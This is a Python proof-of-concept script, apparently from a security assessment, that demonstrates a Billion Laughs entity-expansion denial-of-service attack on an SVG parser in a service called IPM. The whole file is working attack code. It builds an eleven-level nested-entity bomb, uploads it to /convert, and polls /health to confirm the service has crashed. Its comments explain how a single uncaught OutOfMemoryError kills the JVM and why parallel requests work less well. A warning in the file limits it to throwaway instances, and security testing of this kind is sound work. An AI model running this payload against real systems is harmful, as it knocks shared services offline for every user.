#!/usr/bin/env python3
"""
PoC #7: Billion Laughs (entity-expansion DoS) in the SVG parser
---------------------------------------------------------------
SvgMetadataService.parse() uses a DocumentBuilderFactory with no
FEATURE_SECURE_PROCESSING and no entity-expansion cap, so a small SVG with
nested internal entities expands exponentially and exhausts the JVM's memory/CPU
on the IPM host.

This is the DoS twin of #3, but at a different layer: #3 floods ImageMagick with
pixels; #7 floods IPM's own XML parser with entity expansions.

We send a classic lol1..lol11 bomb (a few hundred bytes that expands toward
~10^11 nodes). One thread building a multi-terabyte text node under the
container's 1g memory cap drives the JVM into sustained OutOfMemoryError / GC
thrash, which is enough to take the whole service down (IPM is deliberately NOT
auto-restarted on crash — see ota-agent.sh).

CONFIRMATION IS BY LIVENESS, NOT BY THE BOMB REQUEST'S OWN FATE. A slow or 500'd
bomb request only proves that one request suffered; it does NOT prove denial of
service, because a per-request heap OOM kills just the request thread and the
JVM keeps serving everyone else. So we baseline GET /health, fire the bomb, then
poll GET /health: the DoS is confirmed only if the service stops answering
(connection refused = process/container down, or sustained timeouts = JVM
unresponsive). If /health keeps returning "ok", the parser hurt only itself and
this is reported as NOT a full DoS.

WARNING: this genuinely takes the target down — run it against a throwaway
instance.

Run IPM first, then:  python3 07_billion_laughs.py [host] [port]
"""
import sys
import threading
import time
import urllib.error
import urllib.request
import uuid

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
BASE = f"http://{HOST}:{PORT}"

# Bomb request timeout: the bomb thread may hang for a long time as it thrashes;
# we don't wait for it, we watch /health instead.
CLIENT_TIMEOUT = 20
# Depth of the entity chain. Factor-10 nesting => ~10^DEPTH expansions of the
# top entity; DEPTH=11 (~10^11) is far past what fits in the 1g heap, so the
# allocating thread cannot recover with a mere per-request OOM.
DEPTH = 11
# Confirmation strategy (see module docstring): fire ONE bomb and watch a
# separate client's /health for the JVM to die. This is deliberately a SINGLE
# request, not a flood — one uninterrupted expansion drives an *uncaught*
# OutOfMemoryError that unwinds the whole process (observed: container exits with
# code 3, "Terminating due to java.lang.OutOfMemoryError"). Running several in
# parallel is actually counterproductive: each request OOMs on a smaller slice of
# the shared heap, and a *caught* per-request OOM lets the JVM survive and GC the
# freed buffers. Filling the 1g heap from one expansion takes ~15s on the capped
# (cpus=1.0, 1g) container, so the window must comfortably clear that; once the
# process exits, /health is connection-refused and the streak confirms fast.
CLIENT_TIMEOUT = 25      # must exceed the ~15s single-expansion time-to-OOM
LIVENESS_WINDOW = 18     # comfortably clears the ~15s crash on the capped container
LIVENESS_INTERVAL = 1.0
HEALTH_TIMEOUT = 2
# Consecutive failed /health probes that confirm the service is down (not a
# single GC pause). After the uncaught OOM the process is gone and stays gone
# (IPM does not auto-restart), so connection-refused piles up immediately.
DOWN_STREAK_TO_CONFIRM = 2


def build_bomb(depth):
    lines = ['<?xml version="1.0"?>', '<!DOCTYPE svg [',
             '<!ENTITY lol "lol">']
    for i in range(1, depth + 1):
        prev = "lol" if i == 1 else f"lol{i-1}"
        lines.append(f'<!ENTITY lol{i} "&{prev};&{prev};&{prev};&{prev};&{prev};'
                     f'&{prev};&{prev};&{prev};&{prev};&{prev};">')
    lines.append(']>')
    lines.append('<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">'
                 f'<desc>&lol{depth};</desc></svg>')
    return "\n".join(lines).encode()


def post_svg(svg_bytes, timeout):
    boundary = "----ipmPoC" + uuid.uuid4().hex
    body = (f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="image"; filename="lol.svg"\r\n'
            f"Content-Type: image/svg+xml\r\n\r\n").encode()
    body += svg_bytes + b"\r\n" + f"--{boundary}--\r\n".encode()
    req = urllib.request.Request(f"{BASE}/convert", data=body, method="POST")
    req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.status, r.read().decode(errors="replace")


def probe_health(timeout=HEALTH_TIMEOUT):
    """Return (up, detail). up=True only if GET /health answers 200 'ok'."""
    try:
        req = urllib.request.Request(f"{BASE}/health", method="GET")
        with urllib.request.urlopen(req, timeout=timeout) as r:
            body = r.read().decode(errors="replace").strip()
            return (r.status == 200 and body == "ok"), f"{r.status} {body!r}"
    except urllib.error.HTTPError as e:
        # An HTTP error still means the server is answering.
        return False, f"HTTP {e.code}"
    except Exception as e:
        # Connection refused / timeout / reset == not serving.
        return False, type(e).__name__


def main():
    # 0) Baseline: the service must be healthy before we can claim we downed it.
    up, detail = probe_health()
    if not up:
        print(f"[!] Pre-check: /health is not 'ok' ({detail}); is IPM running? "
              "Cannot run DoS test against an already-down service.")
        sys.exit(2)
    print(f"[*] Pre-check: /health OK ({detail})")

    bomb = build_bomb(DEPTH)
    print(f"[*] Uploading one {len(bomb)}-byte billion-laughs SVG (lol1..lol{DEPTH}, "
          f"~10^{DEPTH} expansions)")

    # 1) Fire ONE bomb in the BACKGROUND. We do NOT wait on its own outcome — a
    #    synchronous wait would burn CLIENT_TIMEOUT before we start watching
    #    liveness. Kick it off on a daemon thread and go straight to the liveness
    #    watch; the thread is reaped on process exit.
    def fire_bomb():
        start = time.time()
        try:
            status, resp = post_svg(bomb, CLIENT_TIMEOUT)
            print(f"[*] bomb /convert -> {status} in {time.time()-start:.1f}s: "
                  f"{resp[:120]}")
        except Exception as e:
            print(f"[*] bomb /convert hung/failed after {time.time()-start:.1f}s "
                  f"({type(e).__name__}) — expected")

    threading.Thread(target=fire_bomb, daemon=True).start()
    time.sleep(0.5)  # let the upload land and the parser start expanding

    # 2) Liveness watch: has the SERVICE gone down, not just this one request?
    print(f"[*] Polling /health for up to {LIVENESS_WINDOW}s to confirm the "
          "shared service itself is down...")
    deadline = time.time() + LIVENESS_WINDOW
    down_streak = 0
    last_detail = ""
    while time.time() < deadline:
        up, detail = probe_health()
        last_detail = detail
        if up:
            down_streak = 0
        else:
            down_streak += 1
            print(f"[*]   /health not serving ({detail}) "
                  f"[{down_streak} consecutive]")
            # Consecutive failures => not a momentary GC pause; the service is
            # down. (Connection-refused means the container has exited on the
            # uncaught OOM, since IPM does not auto-restart on crash.)
            if down_streak >= DOWN_STREAK_TO_CONFIRM:
                print(f"[+] Billion-laughs DoS confirmed — IPM /health stopped "
                      f"serving ({detail}) for {down_streak} consecutive probes; "
                      "the shared service is down for every client, not just the "
                      "bomb request.")
                return
        time.sleep(LIVENESS_INTERVAL)

    # 3) Survived the whole window: the parser only hurt its own request.
    print(f"[-] IPM /health still serving at end of window (last: {last_detail}). "
          "The entity expansion errored its own request but did NOT deny the "
          "service — not a full DoS (parser may be hardened with "
          "FEATURE_SECURE_PROCESSING / an expansion cap).")
    sys.exit(1)


if __name__ == "__main__":
    main()
